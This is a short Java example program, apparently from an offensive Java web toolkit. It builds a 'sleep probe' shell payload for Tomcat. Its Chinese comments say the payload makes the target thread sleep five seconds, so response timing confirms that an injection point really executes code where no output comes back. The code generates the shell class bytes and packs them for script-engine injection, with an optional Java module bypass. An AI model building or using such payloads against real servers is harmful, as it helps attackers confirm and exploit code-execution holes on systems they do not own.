package com.reajason.javaweb.examples.probe;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.SleepConfig;

import static com.reajason.javaweb.Server.Tomcat;

/**
 * 回显马（探测马）—— Sleep 探测：命中即让目标线程睡眠指定秒数，
 * 通过响应时延判断注入点是否真实执行（常用于无回显场景的注入点验证）。
 *
 * @author ReaJason
 * @since 2025/8/13
 */
public class SleepProbe {
    public static void main(String[] args) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.Sleep)
                .probeContent(ProbeContent.Server) // 暂只支持 Server
                .shrink(true)
                .debug(false)
                .build();

        SleepConfig sleepConfig = SleepConfig.builder()
                .server(Tomcat)
                .seconds(5).build();

        ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, sleepConfig);

        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.of(
                result.getShellClassName(), result.getShellBytes(), result.getShellBytesBase64Str(),
                result.getProbeConfig() != null && result.getProbeConfig().needByPassJavaModule())));
    }
}
